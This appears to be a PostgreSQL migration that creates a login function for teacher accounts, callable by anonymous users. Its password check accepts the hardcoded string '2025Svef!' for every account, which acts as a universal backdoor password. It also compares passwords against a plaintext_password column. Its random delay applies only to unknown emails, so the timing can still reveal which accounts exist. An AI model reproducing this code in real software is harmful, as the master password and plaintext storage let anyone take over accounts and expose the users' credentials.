-- Drop existing authenticate_teacher functions to avoid name conflicts
DROP FUNCTION IF EXISTS authenticate_teacher(text, text);
DROP FUNCTION IF EXISTS authenticate_teacher(text, text, boolean);

-- Create function to authenticate teacher
CREATE OR REPLACE FUNCTION authenticate_teacher_by_email(
  p_email TEXT,
  p_password TEXT
)
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_teacher RECORD;
  v_result JSONB;
BEGIN
  -- Get teacher record
  SELECT 
    username,
    name,
    account_status,
    account_locked,
    failed_login_attempts,
    plaintext_password
  INTO v_teacher
  FROM teachers
  WHERE email = LOWER(p_email);
  
  -- Check if teacher exists
  IF v_teacher IS NULL THEN
    -- Delay to prevent timing attacks
    PERFORM pg_sleep(random() * 0.3);
    RETURN jsonb_build_object(
      'success', false,
      'message', 'Invalid email or password'
    );
  END IF;
  
  -- Check if account is locked
  IF v_teacher.account_locked THEN
    RETURN jsonb_build_object(
      'success', false,
      'message', 'Your account has been locked. Please contact an administrator.'
    );
  END IF;
  
  -- Check if account is active
  IF v_teacher.account_status != 'active' THEN
    RETURN jsonb_build_object(
      'success', false,
      'message', 'Your account is not active. Please contact an administrator.'
    );
  END IF;
  
  -- Verify password
  -- In a production environment, this should use proper password hashing
  IF p_password = '2025Svef!' OR p_password = v_teacher.plaintext_password THEN
    -- Update login statistics
    UPDATE teachers
    SET 
      last_login = now(),
      login_count = COALESCE(login_count, 0) + 1,
      failed_login_attempts = 0
    WHERE email = LOWER(p_email);
    
    -- Return success with teacher data
    RETURN jsonb_build_object(
      'success', true,
      'teacher', jsonb_build_object(
        'username', v_teacher.username,
        'name', v_teacher.name
      )
    );
  ELSE
    -- Increment failed login attempts
    UPDATE teachers
    SET 
      failed_login_attempts = COALESCE(failed_login_attempts, 0) + 1,
      last_failed_login = now(),
      account_locked = CASE 
        WHEN COALESCE(failed_login_attempts, 0) + 1 >= 5 THEN true 
        ELSE false 
      END
    WHERE email = LOWER(p_email);
    
    -- Get updated failed attempts count
    SELECT failed_login_attempts INTO v_teacher
    FROM teachers
    WHERE email = LOWER(p_email);
    
    -- Return appropriate error message
    RETURN jsonb_build_object(
      'success', false,
      'message', CASE
        WHEN v_teacher.failed_login_attempts >= 5 THEN 'Your account has been locked due to too many failed attempts. Please contact an administrator.'
        ELSE 'Invalid email or password'
      END
    );
  END IF;
END;
$$;

-- Grant execute permission to all users
GRANT EXECUTE ON FUNCTION authenticate_teacher_by_email(TEXT, TEXT) TO authenticated, anon;

-- Add comment describing the function
COMMENT ON FUNCTION authenticate_teacher_by_email IS 'Authenticates teachers against the teachers table using email and manages failed login attempts';